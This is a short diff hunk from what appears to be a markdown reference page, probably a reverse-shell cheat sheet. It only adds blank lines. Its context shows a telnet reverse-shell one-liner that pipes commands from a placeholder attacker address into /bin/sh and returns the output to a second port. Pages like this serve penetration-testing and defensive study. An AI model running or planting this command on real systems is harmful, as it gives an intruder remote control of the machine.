@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:25:31.686351+00:00'
 ```bash
 telnet <Your_IP> 8080 | /bin/sh | telnet <Your_IP> 8081
 ```
+
+
